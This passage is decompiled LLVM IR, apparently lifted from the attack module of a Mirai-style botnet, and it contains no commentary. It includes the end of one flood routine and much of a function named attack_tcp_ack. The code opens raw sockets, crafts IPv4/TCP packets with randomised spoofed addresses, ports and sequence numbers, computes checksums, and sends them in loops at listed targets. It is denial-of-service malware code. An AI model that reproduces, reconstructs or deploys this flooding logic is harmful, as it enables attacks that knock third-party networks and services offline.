  store i8 3, i8* %v4_f5b4, align 1
  %v1_f5c8 = add i32 %v2_f1b4, 58
  %v4_f5cc = inttoptr i32 %v1_f5c8 to i8*
  store i8 3, i8* %v4_f5cc, align 1
  %v1_f5e0 = add i32 %v2_f1b4, 59
  %v4_f5e4 = inttoptr i32 %v1_f5e0 to i8*
  store i8 6, i8* %v4_f5e4, align 1
  %v3_f600 = load i32, i32* %fd_-92, align 4
  %v1_f604 = add i32 %v3_f600, 1
  br label %dec_label_pc_f60c

dec_label_pc_f60c:                                ; preds = %dec_label_pc_f60c.preheader, %dec_label_pc_f28c
  %v3_f178 = phi i32 [ %v1_f604, %dec_label_pc_f28c ], [ 0, %dec_label_pc_f60c.preheader ]
  store i32 %v3_f178, i32* %fd_-92, align 4
  %sext11 = mul i32 %v3_f178, 16777216
  %v9_f618 = sdiv i32 %sext11, 16777216
  %v10_f618 = icmp sgt i32 %tmp30, %v9_f618
  br i1 %v10_f618, label %dec_label_pc_f178, label %dec_label_pc_f61c.preheader

dec_label_pc_f61c.preheader:                      ; preds = %dec_label_pc_f60c
  %v3_f6f4 = icmp eq i32 %v9_f0fc, -1
  %v3_f718 = icmp eq i16 %v1_ef50, -1
  %v9_f744 = icmp eq i32 %v9_efac, 65535
  %v3_f770 = icmp eq i16 %v1_efd8, -1
  %v9_f79c = icmp eq i32 %v9_eff4, 65535
  %v9_f7c0 = icmp eq i32 %v9_f014, 65535
  %v2_f7dc = icmp eq i8 %v1_f03c, 0
  br label %dec_label_pc_f61c

dec_label_pc_f61c:                                ; preds = %dec_label_pc_f8d4, %dec_label_pc_f61c.preheader
  br label %dec_label_pc_f8d4

dec_label_pc_f628:                                ; preds = %dec_label_pc_f8d4
  %v3_f62c = mul i32 %v3_f680, 4
  %v2_f638 = add i32 %v3_f62c, %v3_ef04
  %v1_f63c = inttoptr i32 %v2_f638 to i32*
  %v2_f63c = load i32, i32* %v1_f63c, align 4
  %v1_f650 = add i32 %v2_f63c, 20
  %v2_f664 = mul i32 %v3_f680, 24
  %v2_f670 = add i32 %v2_f664, %targs
  %v1_f674 = add i32 %v2_f670, 20
  %v2_f674 = inttoptr i32 %v1_f674 to i8*
  %v3_f674 = load i8, i8* %v2_f674, align 1
  %tmp83 = icmp ugt i8 %v3_f674, 31
  br i1 %tmp83, label %dec_label_pc_f6f0, label %dec_label_pc_f680

dec_label_pc_f680:                                ; preds = %dec_label_pc_f628
  %v1_f69c = add i32 %v2_f670, 16
  %v2_f69c = inttoptr i32 %v1_f69c to i32*
  %v3_f69c = load i32, i32* %v2_f69c, align 4
  %v1_f6a4 = call i32 @__GI_ntohl(i32 %v3_f69c)
  store i32 %v1_f6a4, i32* @r4, align 4
  %v0_f6ac = call i32 @rand_next()
  %v3_f6b4 = load i32, i32* %fd_-92, align 4
  %v2_f6c0 = mul i32 %v3_f6b4, 24
  %v2_f6cc = add i32 %v2_f6c0, %targs
  %v1_f6d0 = add i32 %v2_f6cc, 20
  %v2_f6d0 = inttoptr i32 %v1_f6d0 to i8*
  %v3_f6d0 = load i8, i8* %v2_f6d0, align 1
  %v4_f6d0 = zext i8 %v3_f6d0 to i32
  %v6_f6d4 = lshr i32 %v0_f6ac, %v4_f6d0
  %v0_f6d8 = load i32, i32* @r4, align 4
  %v2_f6d8 = add i32 %v0_f6d8, %v6_f6d4
  %v1_f6e0 = call i32 @__GI_htonl(i32 %v2_f6d8)
  %v2_f6ec = add i32 %v2_f63c, 16
  %v3_f6ec = inttoptr i32 %v2_f6ec to i32*
  store i32 %v1_f6e0, i32* %v3_f6ec, align 4
  br label %dec_label_pc_f6f0

dec_label_pc_f6f0:                                ; preds = %dec_label_pc_f628, %dec_label_pc_f680
  br i1 %v3_f6f4, label %dec_label_pc_f6fc, label %dec_label_pc_f70c

dec_label_pc_f6fc:                                ; preds = %dec_label_pc_f6f0
  %v0_f6fc = call i32 @rand_next()
  %v2_f708 = add i32 %v2_f63c, 12
  %v3_f708 = inttoptr i32 %v2_f708 to i32*
  store i32 %v0_f6fc, i32* %v3_f708, align 4
  br label %dec_label_pc_f70c

dec_label_pc_f70c:                                ; preds = %dec_label_pc_f6f0, %dec_label_pc_f6fc
  br i1 %v3_f718, label %dec_label_pc_f720, label %dec_label_pc_f738

dec_label_pc_f720:                                ; preds = %dec_label_pc_f70c
  %v0_f720 = call i32 @rand_next()
  %v1_f734 = trunc i32 %v0_f720 to i16
  %v3_f734 = add i32 %v2_f63c, 4
  %v4_f734 = inttoptr i32 %v3_f734 to i16*
  store i16 %v1_f734, i16* %v4_f734, align 2
  br label %dec_label_pc_f738

dec_label_pc_f738:                                ; preds = %dec_label_pc_f70c, %dec_label_pc_f720
  br i1 %v9_f744, label %dec_label_pc_f74c, label %dec_label_pc_f764

dec_label_pc_f74c:                                ; preds = %dec_label_pc_f738
  %v0_f74c = call i32 @rand_next()
  %v1_f760 = trunc i32 %v0_f74c to i16
  %v3_f760 = inttoptr i32 %v1_f650 to i16*
  store i16 %v1_f760, i16* %v3_f760, align 2
  br label %dec_label_pc_f764

dec_label_pc_f764:                                ; preds = %dec_label_pc_f738, %dec_label_pc_f74c
  br i1 %v3_f770, label %dec_label_pc_f778, label %dec_label_pc_f790

dec_label_pc_f778:                                ; preds = %dec_label_pc_f764
  %v0_f778 = call i32 @rand_next()
  %v1_f78c = trunc i32 %v0_f778 to i16
  %v3_f78c = add i32 %v2_f63c, 22
  %v4_f78c = inttoptr i32 %v3_f78c to i16*
  store i16 %v1_f78c, i16* %v4_f78c, align 2
  br label %dec_label_pc_f790

dec_label_pc_f790:                                ; preds = %dec_label_pc_f764, %dec_label_pc_f778
  br i1 %v9_f79c, label %dec_label_pc_f7a4, label %dec_label_pc_f7b4

dec_label_pc_f7a4:                                ; preds = %dec_label_pc_f790
  %v0_f7a4 = call i32 @rand_next()
  %v2_f7b0 = add i32 %v2_f63c, 24
  %v3_f7b0 = inttoptr i32 %v2_f7b0 to i32*
  store i32 %v0_f7a4, i32* %v3_f7b0, align 4
  br label %dec_label_pc_f7b4

dec_label_pc_f7b4:                                ; preds = %dec_label_pc_f790, %dec_label_pc_f7a4
  br i1 %v9_f7c0, label %dec_label_pc_f7c8, label %dec_label_pc_f7d8

dec_label_pc_f7c8:                                ; preds = %dec_label_pc_f7b4
  %v0_f7c8 = call i32 @rand_next()
  %v2_f7d4 = add i32 %v2_f63c, 28
  %v3_f7d4 = inttoptr i32 %v2_f7d4 to i32*
  store i32 %v0_f7c8, i32* %v3_f7d4, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_f7d8:                                ; preds = %dec_label_pc_f7b4, %dec_label_pc_f7c8
  br i1 %v2_f7dc, label %dec_label_pc_f7fc, label %dec_label_pc_f7e4

dec_label_pc_f7e4:                                ; preds = %dec_label_pc_f7d8
  %v0_f7e4 = call i32 @rand_next()
  %v1_f7f8 = trunc i32 %v0_f7e4 to i16
  %v3_f7f8 = add i32 %v2_f63c, 38
  %v4_f7f8 = inttoptr i32 %v3_f7f8 to i16*
  store i16 %v1_f7f8, i16* %v4_f7f8, align 2
  br label %dec_label_pc_f7fc

dec_label_pc_f7fc:                                ; preds = %dec_label_pc_f7d8, %dec_label_pc_f7e4
  %v3_f804 = add i32 %v2_f63c, 10
  %v4_f804 = inttoptr i32 %v3_f804 to i16*
  store i16 0, i16* %v4_f804, align 2
  %v1_f80c = inttoptr i32 %v2_f63c to i16*
  %v5_f814 = call i16 @checksum_generic(i16* %v1_f80c, i32 20)
  store i16 %v5_f814, i16* %v4_f804, align 2
  %v3_f830 = add i32 %v2_f63c, 36
  %v4_f830 = inttoptr i32 %v3_f830 to i16*
  store i16 0, i16* %v4_f830, align 2
  %v1_f838 = call i32 @__GI_htons(i32 40)
  %v4_f844 = inttoptr i32 %v1_f650 to i8*
  %v1_f848 = trunc i32 %v1_f838 to i16
  %v8_f850 = call i16 @checksum_tcpudp(i32 %v2_f63c, i8* %v4_f844, i16 %v1_f848, i32 40)
  store i16 %v8_f850, i16* %v4_f830, align 2
  %v3_f864 = load i32, i32* %fd_-92, align 4
  %v2_f870 = mul i32 %v3_f864, 24
  %v2_f87c = add i32 %v2_f870, %targs
  %v1_f884 = add i32 %v2_f63c, 22
  %v2_f884 = inttoptr i32 %v1_f884 to i16*
  %v3_f884 = load i16, i16* %v2_f884, align 2
  %v3_f888 = add i32 %v2_f87c, 2
  %v4_f888 = inttoptr i32 %v3_f888 to i16*
  store i16 %v3_f884, i16* %v4_f888, align 2
  %v3_f88c = load i32, i32* %fd_-92, align 4
  %v2_f898 = mul i32 %v3_f88c, 24
  %v2_f8a4 = add i32 %v2_f898, %targs
  %v6_f8c4 = call i32 @__libc_sendto(i32 %v3_f114, i32 %v2_f63c, i32 60, i32 16384, i32 %v2_f8a4, i32 16)
  %v3_f8c8 = load i32, i32* %fd_-92, align 4
  %v1_f8cc = add i32 %v3_f8c8, 1
  br label %dec_label_pc_f8d4

dec_label_pc_f8d4:                                ; preds = %dec_label_pc_f61c, %dec_label_pc_f7fc
  %v3_f680 = phi i32 [ 0, %dec_label_pc_f61c ], [ %v1_f8cc, %dec_label_pc_f7fc ]
  store i32 %v3_f680, i32* %fd_-92, align 4
  %sext12 = mul i32 %v3_f680, 16777216
  %v9_f8e0 = sdiv i32 %sext12, 16777216
  %v10_f8e0 = icmp sgt i32 %tmp30, %v9_f8e0
  br i1 %v10_f8e0, label %dec_label_pc_f628, label %dec_label_pc_f61c

dec_label_pc_f8e8:                                ; preds = %entry, %dec_label_pc_f160
  store i32 %v3_eed4, i32* %r4.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32 %v3_f680, { 0, 3, 1, 2 }
  uselistorder i32 %v2_f63c, { 7, 3, 8, 4, 9, 10, 5, 2, 1, 0, 11, 12, 6, 13 }
  uselistorder i32 %v3_f178, { 0, 2, 1 }
  uselistorder i32 %v3_f114, { 2, 1, 3, 0 }
  uselistorder i32 %v9_eff4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %fd_-92, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 10, 9 }
  uselistorder i32 58, { 0, 2, 1 }
  uselistorder i32 46, { 0, 1, 3, 2, 4 }
  uselistorder i32 42, { 0, 2, 1, 3, 4 }
  uselistorder i8 %opts_len, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f8e8, { 1, 0 }
  uselistorder label %dec_label_pc_f8d4, { 1, 0 }
  uselistorder label %dec_label_pc_f7fc, { 1, 0 }
  uselistorder label %dec_label_pc_f7d8, { 1, 0 }
  uselistorder label %dec_label_pc_f7b4, { 1, 0 }
  uselistorder label %dec_label_pc_f790, { 1, 0 }
  uselistorder label %dec_label_pc_f764, { 1, 0 }
  uselistorder label %dec_label_pc_f738, { 1, 0 }
  uselistorder label %dec_label_pc_f70c, { 1, 0 }
  uselistorder label %dec_label_pc_f6f0, { 1, 0 }
  uselistorder label %dec_label_pc_f60c, { 1, 0 }
  uselistorder label %dec_label_pc_f28c, { 1, 0 }
}

define void @attack_tcp_ack(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %tmp32 = sext i8 %targs_len to i32
  %fd_-104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 63748, i32* %stack_var_-4, align 4
  %v2_f900 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f900, i32* @fp, align 4
  %v3_f92c = call i32 @calloc(i32 %tmp32, i32 4)
  %v9_f94c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 2, i32 0)
  %v1_f954 = trunc i32 %v9_f94c to i8
  %v9_f970 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 3, i32 65535)
  %sext2 = mul i32 %v9_f970, 65536
  %v1_f974 = sdiv i32 %sext2, 65536
  %v1_f978 = trunc i32 %v1_f974 to i16
  %v9_f990 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 4, i32 64)
  %v1_f998 = trunc i32 %v9_f990 to i8
  %v9_f9b0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 5, i32 0)
  %sext4 = mul i32 %v9_f9b0, 16777216
  %v1_f9b4 = sdiv i32 %sext4, 16777216
  %v1_f9b8 = trunc i32 %v1_f9b4 to i8
  %v9_f9d4 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 6, i32 65535)
  %v9_f9f8 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 7, i32 65535)
  %sext5 = mul i32 %v9_f9f8, 65536
  %v1_f9fc = sdiv i32 %sext5, 65536
  %v1_fa00 = trunc i32 %v1_f9fc to i16
  %v9_fa1c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 17, i32 65535)
  %v9_fa40 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 18, i32 65535)
  %v9_fa60 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 11, i32 0)
  %v9_fa80 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 12, i32 1)
  %v9_faa0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 13, i32 0)
  %v9_fac0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 14, i32 0)
  %v9_fae0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 15, i32 0)
  %v9_fb00 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 16, i32 0)
  %v9_fb20 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 0, i32 512)
  %v9_fb40 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 1, i32 1)
  %sext11 = mul i32 %v9_fb40, 16777216
  %v1_fb44 = sdiv i32 %sext11, 16777216
  %v1_fb48 = trunc i32 %v1_fb44 to i8
  %v2_fb50 = load i32, i32* @LOCAL_ADDR, align 4
  %v9_fb68 = call i32 @attack_get_opt_ip(i8 %opts_len, i32 %opts, i8 25, i32 %v2_fb50)
  %v3_fb80 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_fb90 = icmp eq i32 %v3_fb80, -1
  br i1 %v7_fb90, label %dec_label_pc_10280, label %dec_label_pc_fb98

dec_label_pc_fb98:                                ; preds = %entry
  store i32 1, i32* %fd_-104, align 4
  %v2_fba0 = ptrtoint i32* %fd_-104 to i32
  store i32 0, i32* @r1, align 4
  %v5_fbbc = call i32 @__GI_setsockopt(i32 %v3_fb80, i32 0, i32 3, i32 %v2_fba0, i32 4)
  %v3_fbc4 = icmp eq i32 %v5_fbbc, -1
  br i1 %v3_fbc4, label %dec_label_pc_fbcc, label %dec_label_pc_ff80.preheader

dec_label_pc_ff80.preheader:                      ; preds = %dec_label_pc_fb98
  %fold14 = add i32 %v9_fb20, 40
  %v3_fcac = urem i32 %fold14, 65536
  %v4_fcc8 = urem i32 %v1_f974, 65536
  %v2_fcf4 = icmp eq i8 %v1_f9b8, 0
  %v4_fd70 = urem i32 %v1_f9fc, 65536
  %v3_fd94 = urem i32 %v9_fa1c, 65536
  %v1_fddc = urem i32 %v9_fa60, 2
  %v1_fe14 = urem i32 %v9_fa80, 2
  %tmp = sub nsw i32 0, %v1_fe14
  %v3_fe30 = and i32 %tmp, 16
  %v1_fe4c = urem i32 %v9_faa0, 2
  %tmp85 = sub nsw i32 0, %v1_fe4c
  %v3_fe68 = and i32 %tmp85, 8
  %v1_fe84 = urem i32 %v9_fac0, 2
  %tmp86 = sub nsw i32 0, %v1_fe84
  %v1_febc = urem i32 %v9_fae0, 2
  %tmp87 = sub nsw i32 0, %v1_febc
  %v2_fed8 = and i32 %tmp87, 2
  %v1_fef4 = urem i32 %v9_fb00, 2
  %v2_ff3c = icmp eq i32 %v9_faa0, 0
  %tmp88 = sub nsw i32 0, %v1_fddc
  %v3_fdf8 = and i32 %tmp88, 32
  br label %dec_label_pc_ff80

dec_label_pc_fbcc:                                ; preds = %dec_label_pc_fb98
  %v1_fbd0 = call i32 @__GI___libc_close(i32 %v3_fb80)
  br label %dec_label_pc_10280

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_ff80
  %v3_fbe8 = mul i32 %v3_fbe4, 4
  %v2_fbf4 = add i32 %v3_fbe8, %v3_f92c
  store i32 %v2_fbf4, i32* @r4, align 4
  %v2_fc04 = call i32 @calloc(i32 1510, i32 1)
  %v1_fc0c = load i32, i32* @r4, align 4
  %v2_fc0c = inttoptr i32 %v1_fc0c to i32*
  store i32 %v2_fc04, i32* %v2_fc0c, align 4
  %v3_fc10 = load i32, i32* %fd_-104, align 4
  %v3_fc14 = mul i32 %v3_fc10, 4
  %v2_fc20 = add i32 %v3_fc14, %v3_f92c
  %v1_fc24 = inttoptr i32 %v2_fc20 to i32*
  %v2_fc24 = load i32, i32* %v1_fc24, align 4
  %v5_fc28 = inttoptr i32 %v2_fc24 to i8*
  %v1_fc30 = add i32 %v2_fc24, 20
  %v1_fc3c = add i32 %v2_fc24, 40
  %v4_fc40 = inttoptr i32 %v1_fc3c to i8*
  store i8 69, i8* %v5_fc28, align 1
  %v3_fc94 = add i32 %v2_fc24, 1
  %v4_fc94 = inttoptr i32 %v3_fc94 to i8*
  store i8 %v1_f954, i8* %v4_fc94, align 1
  %v1_fcb4 = call i32 @__GI_htons(i32 %v3_fcac)
  %sext15 = mul i32 %v1_fcb4, 65536
  %v1_fcb8 = sdiv i32 %sext15, 65536
  %v1_fcc4 = trunc i32 %v1_fcb8 to i16
  %v3_fcc4 = add i32 %v2_fc24, 2
  %v4_fcc4 = inttoptr i32 %v3_fcc4 to i16*
  store i16 %v1_fcc4, i16* %v4_fcc4, align 2
  %v1_fcd0 = call i32 @__GI_htons(i32 %v4_fcc8)
  %v1_fce0 = trunc i32 %v1_fcd0 to i16
  %v3_fce0 = add i32 %v2_fc24, 4
  %v4_fce0 = inttoptr i32 %v3_fce0 to i16*
  store i16 %v1_fce0, i16* %v4_fce0, align 2
  %v3_fcec = add i32 %v2_fc24, 8
  %v4_fcec = inttoptr i32 %v3_fcec to i8*
  store i8 %v1_f998, i8* %v4_fcec, align 1
  br i1 %v2_fcf4, label %dec_label_pc_fd14, label %dec_label_pc_fcfc

dec_label_pc_fcfc:                                ; preds = %dec_label_pc_fbe4
  %v1_fd00 = call i32 @__GI_htons(i32 16384)
  %sext17 = mul i32 %v1_fd00, 65536
  %v1_fd04 = sdiv i32 %sext17, 65536
  %v1_fd10 = trunc i32 %v1_fd04 to i16
  %v3_fd10 = add i32 %v2_fc24, 6
  %v4_fd10 = inttoptr i32 %v3_fd10 to i16*
  store i16 %v1_fd10, i16* %v4_fd10, align 2
  br label %dec_label_pc_fd14

dec_label_pc_fd14:                                ; preds = %dec_label_pc_fbe4, %dec_label_pc_fcfc
  %v3_fd1c = add i32 %v2_fc24, 9
  %v4_fd1c = inttoptr i32 %v3_fd1c to i8*
  store i8 6, i8* %v4_fd1c, align 1
  %v2_fd28 = add i32 %v2_fc24, 12
  %v3_fd28 = inttoptr i32 %v2_fd28 to i32*
  store i32 %v9_fb68, i32* %v3_fd28, align 4
  %v3_fd2c = load i32, i32* %fd_-104, align 4
  %v2_fd38 = mul i32 %v3_fd2c, 24
  %v2_fd44 = add i32 %v2_fd38, %targs
  %v1_fd48 = add i32 %v2_fd44, 16
  %v2_fd48 = inttoptr i32 %v1_fd48 to i32*
  %v3_fd48 = load i32, i32* %v2_fd48, align 4
  %v2_fd50 = add i32 %v2_fc24, 16
  %v3_fd50 = inttoptr i32 %v2_fd50 to i32*
  store i32 %v3_fd48, i32* %v3_fd50, align 4
  %v1_fd5c = call i32 @__GI_htons(i32 %v9_f9d4)
  %sext18 = mul i32 %v1_fd5c, 65536
  %v1_fd60 = sdiv i32 %sext18, 65536
  %v1_fd6c = trunc i32 %v1_fd60 to i16
  %v3_fd6c = inttoptr i32 %v1_fc30 to i16*
  store i16 %v1_fd6c, i16* %v3_fd6c, align 2
  %v1_fd78 = call i32 @__GI_htons(i32 %v4_fd70)
  %sext19 = mul i32 %v1_fd78, 65536
  %v1_fd7c = sdiv i32 %sext19, 65536
  %v1_fd88 = trunc i32 %v1_fd7c to i16
  %v3_fd88 = add i32 %v2_fc24, 22
  %v4_fd88 = inttoptr i32 %v3_fd88 to i16*
  store i16 %v1_fd88, i16* %v4_fd88, align 2
  %v1_fd9c = call i32 @__GI_htons(i32 %v3_fd94)
  %v2_fdac = add i32 %v2_fc24, 24
  %v3_fdac = inttoptr i32 %v2_fdac to i32*
  store i32 %v1_fd9c, i32* %v3_fdac, align 4
  %v1_fdb4 = add i32 %v2_fc24, 32
  %v2_fdb4 = inttoptr i32 %v1_fdb4 to i8*
  %v3_fdb4 = load i8, i8* %v2_fdb4, align 1
  %v1_fdc0 = urem i8 %v3_fdb4, 16
  %v1_fdc4 = or i8 %v1_fdc0, 80
  store i8 %v1_fdc4, i8* %v2_fdb4, align 1
  %v1_fde4 = add i32 %v2_fc24, 33
  %v2_fde4 = inttoptr i32 %v1_fde4 to i8*
  %v3_fde4 = load i8, i8* %v2_fde4, align 1
  %v4_fde4 = zext i8 %v3_fde4 to i32
  %v1_fdf4 = and i32 %v4_fde4, 192
  %v2_fdfc = or i32 %v1_fdf4, %v3_fdf8
  %v2_fe34 = or i32 %v2_fdfc, %v3_fe30
  %v2_fe6c = or i32 %v2_fe34, %v3_fe68
  %v3_fea0.masked.masked = and i32 %tmp86, 4
  %v1_fed4.masked = or i32 %v2_fe6c, %v3_fea0.masked.masked
  %v1_ff0c = or i32 %v1_fed4.masked, %v2_fed8
  %v2_ff10 = or i32 %v1_ff0c, %v1_fef4
  %v1_ff1c = trunc i32 %v2_ff10 to i8
  store i8 %v1_ff1c, i8* %v2_fde4, align 1
  %v0_ff20 = call i32 @rand_next()
  %v1_ff34 = trunc i32 %v0_ff20 to i16
  %v3_ff34 = add i32 %v2_fc24, 34
  %v4_ff34 = inttoptr i32 %v3_ff34 to i16*
  store i16 %v1_ff34, i16* %v4_ff34, align 2
  br i1 %v2_ff3c, label %dec_label_pc_ff68, label %dec_label_pc_ff44

dec_label_pc_ff44:                                ; preds = %dec_label_pc_fd14
  %v3_ff48 = load i8, i8* %v2_fde4, align 1
  %v1_ff58 = or i8 %v3_ff48, 8
  store i8 %v1_ff58, i8* %v2_fde4, align 1
  br label %dec_label_pc_ff68

dec_label_pc_ff68:                                ; preds = %dec_label_pc_fd14, %dec_label_pc_ff44
  call void @rand_str(i8* %v4_fc40, i32 %v9_fb20)
  %v3_ff74 = load i32, i32* %fd_-104, align 4
  %v1_ff78 = add i32 %v3_ff74, 1
  br label %dec_label_pc_ff80

dec_label_pc_ff80:                                ; preds = %dec_label_pc_ff80.preheader, %dec_label_pc_ff68
  %v3_fbe4 = phi i32 [ %v1_ff78, %dec_label_pc_ff68 ], [ 0, %dec_label_pc_ff80.preheader ]
  store i32 %v3_fbe4, i32* %fd_-104, align 4
  %sext12 = mul i32 %v3_fbe4, 16777216
  %v9_ff8c = sdiv i32 %sext12, 16777216
  %v10_ff8c = icmp sgt i32 %tmp32, %v9_ff8c
  br i1 %v10_ff8c, label %dec_label_pc_fbe4, label %dec_label_pc_ff90.preheader

dec_label_pc_ff90.preheader:                      ; preds = %dec_label_pc_ff80
  %v3_10074 = icmp eq i32 %v9_fb68, -1
  %v3_10098 = icmp eq i16 %v1_f978, -1
  %v9_100c4 = icmp eq i32 %v9_f9d4, 65535
  %v3_100f0 = icmp eq i16 %v1_fa00, -1
  %v9_1011c = icmp eq i32 %v9_fa1c, 65535
  %v9_10140 = icmp eq i32 %v9_fa40, 65535
  %v2_1015c = icmp eq i8 %v1_fb48, 0
  %fold = add i32 %v9_fb20, 20
  %v3_101bc = urem i32 %fold, 65536
  br label %dec_label_pc_ff90

dec_label_pc_ff90:                                ; preds = %dec_label_pc_1026c, %dec_label_pc_ff90.preheader
  br label %dec_label_pc_1026c

dec_label_pc_ff9c:                                ; preds = %dec_label_pc_1026c
  %v3_ffa0 = mul i32 %v3_10000, 4
  %v2_ffac = add i32 %v3_ffa0, %v3_f92c
  %v1_ffb0 = inttoptr i32 %v2_ffac to i32*
  %v2_ffb0 = load i32, i32* %v1_ffb0, align 4
  %v1_ffc4 = add i32 %v2_ffb0, 20
  %v4_ffc8 = inttoptr i32 %v1_ffc4 to i8*
  %v1_ffd0 = add i32 %v2_ffb0, 40
  %v4_ffd4 = inttoptr i32 %v1_ffd0 to i8*
  %v2_ffe4 = mul i32 %v3_10000, 24
  %v2_fff0 = add i32 %v2_ffe4, %targs
  %v1_fff4 = add i32 %v2_fff0, 20
  %v2_fff4 = inttoptr i32 %v1_fff4 to i8*
  %v3_fff4 = load i8, i8* %v2_fff4, align 1
  %tmp89 = icmp ugt i8 %v3_fff4, 31
  br i1 %tmp89, label %dec_label_pc_10070, label %dec_label_pc_10000

dec_label_pc_10000:                               ; preds = %dec_label_pc_ff9c
  %v1_1001c = add i32 %v2_fff0, 16
  %v2_1001c = inttoptr i32 %v1_1001c to i32*
  %v3_1001c = load i32, i32* %v2_1001c, align 4
  %v1_10024 = call i32 @__GI_ntohl(i32 %v3_1001c)
  store i32 %v1_10024, i32* @r4, align 4
  %v0_1002c = call i32 @rand_next()
  %v3_10034 = load i32, i32* %fd_-104, align 4
  %v2_10040 = mul i32 %v3_10034, 24
  %v2_1004c = add i32 %v2_10040, %targs
  %v1_10050 = add i32 %v2_1004c, 20
  %v2_10050 = inttoptr i32 %v1_10050 to i8*
  %v3_10050 = load i8, i8* %v2_10050, align 1
  %v4_10050 = zext i8 %v3_10050 to i32
  %v6_10054 = lshr i32 %v0_1002c, %v4_10050
  %v0_10058 = load i32, i32* @r4, align 4
  %v2_10058 = add i32 %v0_10058, %v6_10054
  %v1_10060 = call i32 @__GI_htonl(i32 %v2_10058)
  %v2_1006c = add i32 %v2_ffb0, 16
  %v3_1006c = inttoptr i32 %v2_1006c to i32*
  store i32 %v1_10060, i32* %v3_1006c, align 4
  br label %dec_label_pc_10070

dec_label_pc_10070:                               ; preds = %dec_label_pc_ff9c, %dec_label_pc_10000
  br i1 %v3_10074, label %dec_label_pc_1007c, label %dec_label_pc_1008c

dec_label_pc_1007c:                               ; preds = %dec_label_pc_10070
  %v0_1007c = call i32 @rand_next()
  %v2_10088 = add i32 %v2_ffb0, 12
  %v3_10088 = inttoptr i32 %v2_10088 to i32*
  store i32 %v0_1007c, i32* %v3_10088, align 4
  br label %dec_label_pc_1008c

dec_label_pc_1008c:                               ; preds = %dec_label_pc_10070, %dec_label_pc_1007c
  br i1 %v3_10098, label %dec_label_pc_100a0, label %dec_label_pc_100b8

dec_label_pc_100a0:                               ; preds = %dec_label_pc_1008c
  %v0_100a0 = call i32 @rand_next()
  %v1_100b4 = trunc i32 %v0_100a0 to i16
  %v3_100b4 = add i32 %v2_ffb0, 4
  %v4_100b4 = inttoptr i32 %v3_100b4 to i16*
  store i16 %v1_100b4, i16* %v4_100b4, align 2
  br label %dec_label_pc_100b8

dec_label_pc_100b8:                               ; preds = %dec_label_pc_1008c, %dec_label_pc_100a0
  br i1 %v9_100c4, label %dec_label_pc_100cc, label %dec_label_pc_100e4

dec_label_pc_100cc:                               ; preds = %dec_label_pc_100b8
  %v0_100cc = call i32 @rand_next()
  %v1_100e0 = trunc i32 %v0_100cc to i16
  %v3_100e0 = inttoptr i32 %v1_ffc4 to i16*
  store i16 %v1_100e0, i16* %v3_100e0, align 2
  br label %dec_label_pc_100e4

dec_label_pc_100e4:                               ; preds = %dec_label_pc_100b8, %dec_label_pc_100cc
  br i1 %v3_100f0, label %dec_label_pc_100f8, label %dec_label_pc_10110

dec_label_pc_100f8:                               ; preds = %dec_label_pc_100e4
  %v0_100f8 = call i32 @rand_next()
  %v1_1010c = trunc i32 %v0_100f8 to i16
  %v3_1010c = add i32 %v2_ffb0, 22
  %v4_1010c = inttoptr i32 %v3_1010c to i16*
  store i16 %v1_1010c, i16* %v4_1010c, align 2
  br label %dec_label_pc_10110

dec_label_pc_10110:                               ; preds = %dec_label_pc_100e4, %dec_label_pc_100f8
  br i1 %v9_1011c, label %dec_label_pc_10124, label %dec_label_pc_10134

dec_label_pc_10124:                               ; preds = %dec_label_pc_10110
  %v0_10124 = call i32 @rand_next()
  %v2_10130 = add i32 %v2_ffb0, 24
  %v3_10130 = inttoptr i32 %v2_10130 to i32*
  store i32 %v0_10124, i32* %v3_10130, align 4
  br label %dec_label_pc_10134

dec_label_pc_10134:                               ; preds = %dec_label_pc_10110, %dec_label_pc_10124
  br i1 %v9_10140, label %dec_label_pc_10148, label %dec_label_pc_10158

dec_label_pc_10148:                               ; preds = %dec_label_pc_10134
  %v0_10148 = call i32 @rand_next()
  %v2_10154 = add i32 %v2_ffb0, 28
  %v3_10154 = inttoptr i32 %v2_10154 to i32*
  store i32 %v0_10148, i32* %v3_10154, align 4
  br label %dec_label_pc_10158

dec_label_pc_10158:                               ; preds = %dec_label_pc_10134, %dec_label_pc_10148
  br i1 %v2_1015c, label %dec_label_pc_10170, label %dec_label_pc_10164

dec_label_pc_10164:                               ; preds = %dec_label_pc_10158
  call void @rand_str(i8* %v4_ffd4, i32 %v9_fb20)
  br label %dec_label_pc_10170

dec_label_pc_10170:                               ; preds = %dec_label_pc_10158, %dec_label_pc_10164
  %v3_10178 = add i32 %v2_ffb0, 10
  %v4_10178 = inttoptr i32 %v3_10178 to i16*
  store i16 0, i16* %v4_10178, align 2
  %v1_10180 = inttoptr i32 %v2_ffb0 to i16*
  %v5_10188 = call i16 @checksum_generic(i16* %v1_10180, i32 20)
  store i16 %v5_10188, i16* %v4_10178, align 2
